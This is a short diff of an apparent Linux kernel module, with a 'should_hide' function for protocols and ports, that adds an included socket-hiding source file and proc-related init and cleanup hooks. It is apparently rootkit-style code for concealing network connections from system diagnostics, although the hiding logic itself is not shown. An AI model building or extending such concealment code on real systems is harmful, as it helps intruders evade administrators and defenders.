@@ -46,6 +46,7 @@ bool should_hide(int proto, int port)
 #include "inet_diag.orig.c"
 #include "tcp_diag.c"
 #include "udp_diag.c"
+#include "socket_hiding.c"
 
 int init_module(void){
     printk(KERN_INFO "Hello world\n");
@@ -53,11 +54,8 @@ int init_module(void){
     inet_diag_init();
     tcp_diag_init();
     udp_diag_init();
-/*    inet_diag_unregister(&tcp_diag_handler);
-    inet_diag_unregister(&udp_diag_handler);
-    inet_diag_register(&tcp_diag_handler);
-    inet_diag_register(&udp_diag_handler);
-    //sock_diag_register(&inet_diag_handler);*/
+
+    init_procstuff();
 
     return 0;
 }
@@ -68,9 +66,8 @@ void cleanup_module(void){
     udp_diag_exit();
     tcp_diag_exit();
     inet_diag_exit();
-//    inet_diag_unregister(&tcp_diag_handler);
-//    inet_diag_unregister(&udp_diag_handler);
-    //sock_diag_unregister(&inet_diag_handler);
+
+    cleanup_procstuff();
 
     return;
 }
